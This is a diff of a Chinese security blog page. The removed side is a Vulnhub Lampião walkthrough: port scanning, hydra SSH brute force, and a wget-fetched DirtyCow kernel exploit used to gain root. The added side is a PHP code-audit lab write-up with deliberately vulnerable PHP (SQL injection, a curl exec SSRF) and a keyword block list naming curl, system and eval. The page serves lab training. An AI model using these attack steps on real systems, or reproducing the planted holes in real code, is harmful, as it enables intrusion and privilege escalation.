@@ -15,25 +15,24 @@
 
 
 
-<meta name="description" content="作者：KarmA@D0g3，本文转自先知社区，未经许可禁止转载 记录一下自己的Vulnhub-Lampião: 1 通关过程">
-<meta name="keywords" content="Summary,Vulnhub,Penetration Testing">
+<meta name="description" content="红日安全——代码审计项目复现～">
+<meta name="keywords" content="CTF,Summary,Code Audit">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulnhub-Lampião：1 通关指南">
-<meta property="og:url" content="http://blog.0akarma.me/Study/vulnhub-lampião.html">
+<meta property="og:title" content="PHP-Audit-Labs 复现">
+<meta property="og:url" content="http://blog.0akarma.me/Study/HR-audit.html">
 <meta property="og:site_name" content="KarmA @ D0g3">
-<meta property="og:description" content="作者：KarmA@D0g3，本文转自先知社区，未经许可禁止转载 记录一下自己的Vulnhub-Lampião: 1 通关过程">
+<meta property="og:description" content="红日安全——代码审计项目复现～">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fvil0a0n2xj31gu16i7fn.jpg">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fvikzz43zwj30we0v4789.jpg">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fvikzy4118j30we0v4789.jpg">
-<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fvil2172opj31d40figpa.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fvil231biej312c0mitd9.jpg">
-<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20180827225607-543a036c-aa09-1.png">
-<meta property="og:updated_time" content="2018-10-11T16:41:29.087Z">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fwh1kw6m8xj30s105tdfx.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fwh4ctaxy3j30bn0imt9e.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwgy1fwj26cqbcwj30o406st8t.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwgy1fwj26wmkzej30sq04kaa4.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fwjbnin68lj30sl06zt8p.jpg">
+<meta property="og:updated_time" content="2018-11-03T04:03:42.856Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Vulnhub-Lampião：1 通关指南">
-<meta name="twitter:description" content="作者：KarmA@D0g3，本文转自先知社区，未经许可禁止转载 记录一下自己的Vulnhub-Lampião: 1 通关过程">
-<meta name="twitter:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fvil0a0n2xj31gu16i7fn.jpg">
+<meta name="twitter:title" content="PHP-Audit-Labs 复现">
+<meta name="twitter:description" content="红日安全——代码审计项目复现～">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fwh1kw6m8xj30s105tdfx.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -63,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Vulnhub-Lampião：1 通关指南 | KarmA @ D0g3</title>
+<title>PHP-Audit-Labs 复现 | KarmA @ D0g3</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -268,11 +267,11 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
-      <div class="body-wrap"><article id="post-vulnhub-Lampiao-1" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-hrctf" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/Study/vulnhub-lampião.html" class="article-date">
-      <time datetime="2018-08-22T10:39:24.000Z" itemprop="datePublished">2018-08-22</time>
+      <a href="/Study/HR-audit.html" class="article-date">
+      <time datetime="2018-10-22T08:33:08.000Z" itemprop="datePublished">2018-10-22</time>
 </a>
 
 
@@ -285,7 +284,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Vulnhub-Lampião：1 通关指南
+      PHP-Audit-Labs 复现
     </h1>
   
 
@@ -302,7 +301,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Penetration-Testing/">Penetration Testing</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnhub/">Vulnhub</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Code-Audit/">Code Audit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -314,59 +313,53 @@
           
         <excerpt in="" index="" |="" 首页摘要="">
 
-<p><strong>作者：KarmA@D0g3，本文转自<a href="https://xz.aliyun.com/t/2647" target="_blank" rel="noopener">先知社区</a>，未经许可禁止转载</strong></p>
-<p>记录一下自己的Vulnhub-Lampião: 1 通关过程<a id="more"></a></p>
+<p>红日安全——代码审计项目复现～<a id="more"></a></p>
 <the rest="" of="" contents="" |="" 余下全文="">
 
-<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>你想继续攻击自己的实验室吗？试试这个全新的易受攻击机器！“Lampião1”。</p>
-<p>Goal：得到root权限</p>
-<p>Difficulty：easy</p>
-<p>Lampião1是一个巴西著名的土匪领袖，flag里面有他的肖像。</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先用netdiscover确定靶机ip，再用nmap扫下端口</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fvil0a0n2xj31gu16i7fn.jpg" alt="1"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一开始用下面这条命令是扫不出1898端口的（这也是我一开始卡着不知道怎么往下走的原因）</span><br><span class="line">nmap -A 192.168.88.112</span><br><span class="line">用下面这条才能扫出来</span><br><span class="line">nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.11.131</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><code>-n</code> (不用域名解析)； <code>-V</code> (打印版本信息)；<code>-Pn</code> (不检测主机存活)；<code>--reason</code> (显示端口处于带确认状态的原因)；<code>-oN</code> (将标准输出直接写入指定的文件) ；<code>-p-</code> (应该是全部端口都扫一遍)</p>
+<h1 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 Wish List"></a>Day 1 Wish List</h1><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><blockquote>
+<p>(PHP 4, PHP 5, PHP 7)</p>
+<p>in_array — 检查数组中是否存在某个值</p>
+<p>bool in_array ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$needle（待搜索值）</code> , array <code>$haystack（待搜索的数组）</code> [, bool <code>$strict</code> = <strong>FALSE</strong> ] )</p>
 </blockquote>
-<p>22是ssh端口，那就先按照惯例，看看80端口吧。</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fvikzz43zwj30we0v4789.jpg" alt="2"></p>
-<p>就一个字符画，有个fi duma egud？不晓得什么意思～～</p>
-<h2 id="Durpal"><a href="#Durpal" class="headerlink" title="Durpal"></a>Durpal</h2><p>既然80端口没有什么收获，那就来1898端口瞧瞧，看到是Drupal，那就先常规思路走一波</p>
-<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>网上的都是drupal 7.x 利用PHP filter模块去getshell，但是这里登陆模块似乎用不了？因为注册时激活邮件发不出去，没办法激活，所以这条路看来是走不通了。</p>
-<h3 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h3><p>这不是一个纯英文的网站，会不会有可能网站里面的英文是密码提示？？可不可以做个字典爆破一波？</p>
-<p><strong><a href="https://github.com/digininja/CeWL" target="_blank" rel="noopener">Cewl</a></strong>了解一下，</p>
-<p>默认文章肯定不会有tips，那就弄另一篇生成个字典看看</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cewl -w dict.txt http://192.168.11.131:1898/?q=node/1</span></span><br></pre></td></tr></table></figure>
-<p>仔细观察，发现还有两个作者（username？？），试试呗～</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fvikzy4118j30we0v4789.jpg" alt="3"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo tiago &gt; usernames.txt</span></span><br><span class="line"><span class="comment"># echo eder &gt;&gt; usernames.txt</span></span><br></pre></td></tr></table></figure>
-<p>爆破工具<strong><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">hydra</a></strong>了解一下……</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fvil2172opj31d40figpa.jpg" alt="4"></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwh1kw6m8xj30s105tdfx.jpg" alt=""></p>
+<p>因为php是弱类型语言，in_array()第三个参数如果没有设置TRUE的话，就不会检查needle和haystack类型是否相同，若不同就会进行强制转换，进而导致绕过，造成任意文件上传。</p>
+<h3 id="课后练习–SQL-Injection"><a href="#课后练习–SQL-Injection" class="headerlink" title="课后练习–SQL Injection"></a>课后练习–SQL Injection</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$whitelist = <span class="keyword">array</span>();</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $whitelist = range(<span class="number">1</span>, $row[<span class="string">'COUNT(*)'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = stop_hack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users WHERE id=$id"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($id, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"id $id is not in whitelist."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;"</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($row <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"fire"</span>;</span><br><span class="line">$password = <span class="string">"fire"</span>;</span><br><span class="line">$dbname = <span class="string">"day1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stop_hack</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">    $pattern = <span class="string">"insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval"</span>;</span><br><span class="line">    $back_list = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line">    <span class="keyword">foreach</span>($back_list <span class="keyword">as</span> $hack)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/$hack/i"</span>, $value))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"$hack detected!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 搭建CTF环境使用的sql语句</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> day1;</span><br><span class="line"><span class="keyword">use</span> day1;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">users</span> (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">6</span>) <span class="keyword">unsigned</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">email <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">salary <span class="built_in">int</span>(<span class="number">8</span>) <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">'Lucia'</span>,<span class="string">'Lucia@hongri.com'</span>,<span class="number">3000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">'Danny'</span>,<span class="string">'Danny@hongri.com'</span>,<span class="number">4500</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">3</span>,<span class="string">'Alina'</span>,<span class="string">'Alina@hongri.com'</span>,<span class="number">2700</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">4</span>,<span class="string">'Jameson'</span>,<span class="string">'Jameson@hongri.com'</span>,<span class="number">10000</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">users</span> <span class="keyword">VALUES</span>(<span class="number">5</span>,<span class="string">'Allie'</span>,<span class="string">'Allie@hongri.com'</span>,<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag(flag <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> flag <span class="keyword">VALUES</span>(<span class="string">'HRCTF&#123;1n0rrY_i3_Vu1n3rab13&#125;'</span>);</span><br></pre></td></tr></table></figure>
+<p>此题包含一个in_array和一个sql报错注入，但是这里的in_array绕过与否，对拿flag没什么影响。</p>
+<h4 id="in-array-1"><a href="#in-array-1" class="headerlink" title="in_array()"></a>in_array()</h4><p>这里的白名单是用户的id，1～5，如果id不在白名单内的话，会返回<code>id $id is not in whitelist.</code> 绕过，只需以数字开头，后面随意，即会返回<code>Unknown cloumn &#39;&#39; in &#39;where clause&#39;</code> 即绕过成功。</p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>由于stop_hack()函数里面过滤了很多关键字，所以很多注入都无法实现，这里我用updatexml()，但是字符串拼接函数也被禁用了，然后又get到了一些新姿势</p>
+<p><strong>MAKE_SET(<em>bits</em>,<em>str1</em>,<em>str2</em>,…)</strong></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwh4ctaxy3j30bn0imt9e.jpg" alt=""></p>
+<p>可以按照上图来理解</p>
+<p>也可以理解为：</p>
+<p>bits的参数会转为二进制，如，1为，0001,倒过来排序，则为1000,将bits后面的字符串str1,str2等，放置在这个倒过来的二进制排序中，取出值为1对应的字符串，则得到welcome；如， 1 | 4  -&gt;  0001 | 0100 = 0101 倒序排列的到 1010 得到 welcome,w3r，还有要注意的就是NULL，不取出 ，只有二进制为1时才会取出对应字符串 。</p>
+<p>还可以找到类似的函数：lpad()、reverse()、repeat()、export_set()（<strong>lpad()、reverse()、repeat()这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据</strong>）。</p>
+<h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources:"></a>Resources:</h4><p><a href="https://xz.aliyun.com/t/2160" target="_blank" rel="noopener">updatexml injection without concat</a></p>
+<p><a href="https://xz.aliyun.com/t/2451" target="_blank" rel="noopener">[红日安全]代码审计Day1 - in_array函数缺陷</a></p>
+<h1 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 Twig"></a>Day 2 Twig</h1><h2 id="Twig模版引擎"><a href="#Twig模版引擎" class="headerlink" title="Twig模版引擎"></a>Twig模版引擎</h2><p><a href="https://www.kancloud.cn/yunye/twig-cn/159454" target="_blank" rel="noopener">Twig 中文文档</a></p>
+<p>这是一个模版语言，相当于把一些冗长的语句简化成模版，本题，只是相当于用php内置函数htmlspecialchars去转义字符。</p>
 <blockquote>
-<p>-t 速度，-e nsr就是把用户名密码换着来爆破</p>
+<p>htmlspecialchars</p>
+<p>(PHP 4, PHP 5, PHP 7)</p>
+<p>htmlspecialchars — 将特殊字符转换为 HTML 实体</p>
+<p>string htmlspecialchars ( string <code>$string</code> [, int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 [, string <code>$encoding</code> = ini_get(“default_charset”) [, bool <code>$double_encode</code> = <strong>TRUE</strong> ]]] )</p>
 </blockquote>
-<p>既然搞到账号密码了，赶紧连进去呗。</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fvil231biej312c0mitd9.jpg" alt="5"></p>
-<p>一个低权限，那就查查内核什么的，看看怎么提权</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tiago@lampiao:~$ uname -a</span><br><span class="line">Linux lampiao 4.4.0-31-generic <span class="comment">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line">tiago@lampiao:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 14.04.5 LTS</span><br><span class="line">Release:	14.04</span><br><span class="line">Codename:	trusty</span><br></pre></td></tr></table></figure>
-<p>用一个<a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">脚本</a>看看现成的exp有哪些</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ wget -q -O /tmp/linux-exploit-suggester.sh https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span><br><span class="line">$ chmod +x /tmp/linux-exploit-suggester.sh</span><br><span class="line">$ /tmp/linux-exploit-suggester.sh</span><br><span class="line">...</span><br><span class="line">[+] [CVE-2016-5195] dirtycow 2</span><br><span class="line"></span><br><span class="line">   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails</span><br><span class="line">   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04&#123;kernel:2.6.32-21-generic&#125;,ubuntu=16.04&#123;kernel:4.4.0-21-generic&#125;</span><br><span class="line">   Download URL: https://www.exploit-db.com/download/40839</span><br><span class="line">   ext-url: https://www.exploit-db.com/download/40847.cpp</span><br><span class="line">   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh</span><br></pre></td></tr></table></figure>
-<p>dirtycow走你～</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ wget -q -O /tmp/40847.cpp https://www.exploit-db.com/download/40847.cpp</span><br><span class="line">$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">$ ./dcow -s</span><br><span class="line">Running ...</span><br><span class="line">Password overridden to: dirtyCowFun</span><br><span class="line"></span><br><span class="line">Received su prompt (Password: )</span><br><span class="line"></span><br><span class="line">root@lampiao:~<span class="comment"># echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span></span><br><span class="line">root@lampiao:~<span class="comment"># cp /tmp/.ssh_bak /etc/passwd</span></span><br><span class="line">root@lampiao:~<span class="comment"># rm /tmp/.ssh_bak</span></span><br><span class="line">root@lampiao:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p>Root权限到手～</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@lampiao:~<span class="comment"># cat flag.txt </span></span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
-<p>flag里面这一串是什么鬼～</p>
-<p>在80端口的根目录发现一个lampiao.jpg</p>
-<p>网页上打不开，scp到本地发现下面这幅图</p>
-<p>网页上打不开难道是做过手脚？md5不能解密，那就看看这个图是不是flag</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@lampiao:/var/www/html<span class="comment"># md5sum lampiao.jpg </span></span><br><span class="line">9740616875908d91ddcdaa8aea3af366  lampiao.jpg</span><br></pre></td></tr></table></figure>
-<p>好吧，还真是～著名的Lampião！</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180827225607-543a036c-aa09-1.png" alt="img"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li>条条大路通罗马，套路一定要骚！骚！骚！</li>
-<li>ssh爆破中的cewl和hydra工具的使用</li>
-<li>提权的基本操作</li>
-</ol>
+<h2 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var()"></a>filter_var()</h2><blockquote>
+<p>filter_var</p>
+<p>(PHP 5 &gt;= 5.2.0, PHP 7)</p>
+<p>filter_var — 使用特定的过滤器过滤一个变量</p>
+<p><a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> filter_var ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$variable（待过滤变量）</code> [, int <code>$filter（过滤类型）</code> = FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$options</code> ]] )</p>
+</blockquote>
+<p>这题用js伪协议好像绕过不了～</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwj26cqbcwj30o406st8t.jpg" alt=""></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwgy1fwj26wmkzej30sq04kaa4.jpg" alt=""></p>
+<h3 id="课后练习–SSRF"><a href="#课后练习–SSRF" class="headerlink" title="课后练习–SSRF"></a>课后练习–SSRF</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/sec-redclub.com$/'</span>,$site_info[<span class="string">'host'</span>]))&#123;</span><br><span class="line">        exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">' '</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
